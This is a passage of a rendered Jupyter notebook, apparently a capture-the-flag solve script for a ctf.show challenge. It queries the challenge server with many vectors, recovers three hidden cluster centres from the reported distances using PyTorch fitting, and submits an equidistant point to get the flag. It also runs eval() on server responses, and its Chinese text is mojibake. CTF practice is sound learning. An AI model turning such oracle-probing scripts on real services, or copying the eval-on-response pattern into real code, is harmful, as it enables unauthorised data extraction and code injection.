</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span><span class="lnt">194
</span><span class="lnt">195
</span><span class="lnt">196
</span><span class="lnt">197
</span><span class="lnt">198
</span><span class="lnt">199
</span><span class="lnt">200
</span><span class="lnt">201
</span><span class="lnt">202
</span><span class="lnt">203
</span><span class="lnt">204
</span><span class="lnt">205
</span><span class="lnt">206
</span><span class="lnt">207
</span><span class="lnt">208
</span><span class="lnt">209
</span><span class="lnt">210
</span><span class="lnt">211
</span><span class="lnt">212
</span><span class="lnt">213
</span><span class="lnt">214
</span><span class="lnt">215
</span><span class="lnt">216
</span><span class="lnt">217
</span><span class="lnt">218
</span><span class="lnt">219
</span><span class="lnt">220
</span><span class="lnt">221
</span><span class="lnt">222
</span><span class="lnt">223
</span><span class="lnt">224
</span><span class="lnt">225
</span><span class="lnt">226
</span><span class="lnt">227
</span><span class="lnt">228
</span><span class="lnt">229
</span><span class="lnt">230
</span><span class="lnt">231
</span><span class="lnt">232
</span><span class="lnt">233
</span><span class="lnt">234
</span><span class="lnt">235
</span><span class="lnt">236
</span><span class="lnt">237
</span><span class="lnt">238
</span><span class="lnt">239
</span><span class="lnt">240
</span><span class="lnt">241
</span><span class="lnt">242
</span><span class="lnt">243
</span><span class="lnt">244
</span><span class="lnt">245
</span><span class="lnt">246
</span><span class="lnt">247
</span><span class="lnt">248
</span><span class="lnt">249
</span><span class="lnt">250
</span><span class="lnt">251
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl"> <span class="s2">&#34;cells&#34;</span><span class="p">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">   <span class="s2">&#34;cell_type&#34;</span><span class="p">:</span> <span class="s2">&#34;code&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">   <span class="s2">&#34;execution_count&#34;</span><span class="p">:</span> <span class="kc">None</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">   <span class="s2">&#34;metadata&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;collapsed&#34;</span><span class="p">:</span> <span class="kc">False</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;pycharm&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">     <span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;#</span><span class="si">%%</span><span class="se">\n</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">   <span class="p">},</span>
</span></span><span class="line"><span class="cl">   <span class="s2">&#34;outputs&#34;</span><span class="p">:</span> <span class="p">[],</span>
</span></span><span class="line"><span class="cl">   <span class="s2">&#34;source&#34;</span><span class="p">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;import requests</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;import numpy as np</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;import re</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;import tqdm</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;url=&#39;http://49aa75ee-ea3f-4e12-b75f-ae589cf98959.challenge.ctf.show/&#39;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;for D in range(100,200):</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;     txt = requests.post(url,data={&#39;data[]&#39;:[1]*D}).text</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;     if &#39;ç»´åº¦æœ‰è¯¯&#39; not in txt :</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;        # print(txt)</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;        break</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;print(&#39;D=&#39;,D)</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;rx=[ np.random.random(D)*100 for i in range(500)]</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;ry=[]</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;for i in tqdm.tqdm(rx):</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;    try:</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;        txt = requests.post(url,data={&#39;data[]&#39;:list(i)}).text</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;        # print(txt)</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;        ry.append(eval(re.findall(</span><span class="se">\&#34;</span><span class="s2">(</span><span class="se">\\</span><span class="s2">[.*</span><span class="se">\\</span><span class="s2">])</span><span class="se">\&#34;</span><span class="s2">,txt)[0]))</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;        if </span><span class="se">\&#34;</span><span class="s2">flag</span><span class="se">\&#34;</span><span class="s2"> in txt:</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;            print(txt)</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;            break</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;    except :</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;        print(txt)</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;        break</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;ry = np.array(ry)&#34;</span>
</span></span><span class="line"><span class="cl">   <span class="p">]</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">   <span class="s2">&#34;cell_type&#34;</span><span class="p">:</span> <span class="s2">&#34;code&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">   <span class="s2">&#34;execution_count&#34;</span><span class="p">:</span> <span class="kc">None</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">   <span class="s2">&#34;metadata&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;collapsed&#34;</span><span class="p">:</span> <span class="kc">False</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;pycharm&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">     <span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;#</span><span class="si">%%</span><span class="se">\n</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">   <span class="p">},</span>
</span></span><span class="line"><span class="cl">   <span class="s2">&#34;outputs&#34;</span><span class="p">:</span> <span class="p">[],</span>
</span></span><span class="line"><span class="cl">   <span class="s2">&#34;source&#34;</span><span class="p">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;import torch, torch.nn as nn, torch.optim as optim</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;from torch.utils.data import DataLoader,Dataset,TensorDataset</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;class CTFNN(nn.Module):</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;    def __init__(self,D):</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;        super().__init__()</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;        self.L = nn.Linear(1,D)</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;        self.zero=torch.zeros(1)</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;    def forward(self, x):</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;        y = self.L(self.zero)</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;        return torch.linalg.norm(y-x)</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;class loss(nn.Module):</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;    def __init__(self,*arc):</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;        super().__init__()</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;    def forward(self,x,y):</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;        return torch.abs(x-y)&#34;</span>
</span></span><span class="line"><span class="cl">   <span class="p">]</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">   <span class="s2">&#34;cell_type&#34;</span><span class="p">:</span> <span class="s2">&#34;markdown&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">   <span class="s2">&#34;metadata&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;collapsed&#34;</span><span class="p">:</span> <span class="kc">False</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;pycharm&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">     <span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;#</span><span class="si">%%</span><span class="s2"> md</span><span class="se">\n</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">   <span class="p">},</span>
</span></span><span class="line"><span class="cl">   <span class="s2">&#34;source&#34;</span><span class="p">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;int&#34;</span>
</span></span><span class="line"><span class="cl">   <span class="p">]</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">   <span class="s2">&#34;cell_type&#34;</span><span class="p">:</span> <span class="s2">&#34;code&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">   <span class="s2">&#34;execution_count&#34;</span><span class="p">:</span> <span class="kc">None</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">   <span class="s2">&#34;metadata&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;collapsed&#34;</span><span class="p">:</span> <span class="kc">False</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;pycharm&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">     <span class="s2">&#34;is_executing&#34;</span><span class="p">:</span> <span class="kc">True</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">     <span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;#</span><span class="si">%%</span><span class="se">\n</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">   <span class="p">},</span>
</span></span><span class="line"><span class="cl">   <span class="s2">&#34;outputs&#34;</span><span class="p">:</span> <span class="p">[],</span>
</span></span><span class="line"><span class="cl">   <span class="s2">&#34;source&#34;</span><span class="p">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;import matplotlib.pyplot as plt</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;p=[]</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;for idx in range(3):</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;    ctf =CTFNN(D)</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;    los = []</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;    loss_function = loss()</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;    optimizer = torch.optim.Adam(ctf.parameters(),lr=10)</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;    tx = torch.tensor(rx)</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;    ty = torch.tensor(ry[:,idx])</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;    td = TensorDataset(tx,ty)</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;    loss_fn = loss()</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;    for ep in tqdm.trange(150):</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;        if ep == 10:</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;            optimizer = torch.optim.Adam(ctf.parameters(),lr=1)</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;        if ep == 40:</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;            los=[]</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;            optimizer = torch.optim.Adam(ctf.parameters(),lr=0.1)</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;        if ep == 80:</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;            optimizer = torch.optim.Adam(ctf.parameters(),lr=0.01)</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;        if ep == 130:</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;            optimizer = torch.optim.Adam(ctf.parameters(),lr=0.001)</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;        for i in td:</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;            optimizer.zero_grad()</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;            y = ctf(i[0])</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;            lx = loss_fn(y,i[1])</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;            lx.backward()</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;            optimizer.step()</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;        los.append(lx.item())</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;    plt.figure(figsize=(10,3))</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;    plt.plot(los)</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;    plt.show()</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;    print(los[-1])</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;    p.append( ctf.L.bias.tolist())</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;for px in p:</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;    txt = requests.post(url,data={&#39;data[]&#39;:px}).text</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;    print(re.findall(&#39;æ‚¨çš„æ•°æ®ä¸ä¸‰ä¸ªèšç±»ä¸­å¿ƒçš„æ¬§æ‹‰è·ç¦»åˆ†åˆ«æ˜¯:&lt;br&gt;&lt;br&gt;(.*)å‡æ–¹å·®ä¸º&#39;,txt)[0])&#34;</span>
</span></span><span class="line"><span class="cl">   <span class="p">]</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">   <span class="s2">&#34;cell_type&#34;</span><span class="p">:</span> <span class="s2">&#34;code&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">   <span class="s2">&#34;execution_count&#34;</span><span class="p">:</span> <span class="kc">None</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">   <span class="s2">&#34;metadata&#34;</span><span class="p">:</span> <span class="p">{},</span>
</span></span><span class="line"><span class="cl">   <span class="s2">&#34;outputs&#34;</span><span class="p">:</span> <span class="p">[],</span>
</span></span><span class="line"><span class="cl">   <span class="s2">&#34;source&#34;</span><span class="p">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;class CTFNN2(nn.Module):</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;    def __init__(self,D):</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;        super().__init__()</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;        self.L = nn.Linear(1,D)</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;        self.zero=torch.zeros(1)</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;    def forward(self):</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;        x = self.L(self.zero)</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;        dist =[torch.linalg.norm(A-x) for A in tp]</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;        dist=torch.stack(dist,0)</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;        y = torch.mean(torch.abs(dist - torch.mean(dist))**2)</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;        return y</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;    </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;class loss2(nn.Module):</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;    def __init__(self,*arc):</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;        super().__init__()</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;    def forward(self,x):</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;        return torch.abs(x)&#34;</span>
</span></span><span class="line"><span class="cl">   <span class="p">]</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">   <span class="s2">&#34;cell_type&#34;</span><span class="p">:</span> <span class="s2">&#34;code&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">   <span class="s2">&#34;execution_count&#34;</span><span class="p">:</span> <span class="kc">None</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">   <span class="s2">&#34;metadata&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;collapsed&#34;</span><span class="p">:</span> <span class="kc">False</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;pycharm&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">     <span class="s2">&#34;is_executing&#34;</span><span class="p">:</span> <span class="kc">True</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">     <span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;#</span><span class="si">%%</span><span class="se">\n</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">   <span class="p">},</span>
</span></span><span class="line"><span class="cl">   <span class="s2">&#34;outputs&#34;</span><span class="p">:</span> <span class="p">[],</span>
</span></span><span class="line"><span class="cl">   <span class="s2">&#34;source&#34;</span><span class="p">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;tp=[]</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;tp.append(torch.tensor(p[0]))</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;tp.append(torch.tensor(p[1]))</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;tp.append( torch.tensor(p[2]))</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;ctf2 =CTFNN2(D)</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;loss_function = loss2()</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;optimizer = torch.optim.Adam(ctf2.parameters(),lr=5)</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;tx = torch.tensor(rx)</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;ty = torch.tensor(ry[:,2])</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;td = TensorDataset(tx,ty)</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;los=[]</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;loss_fn = loss2()</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
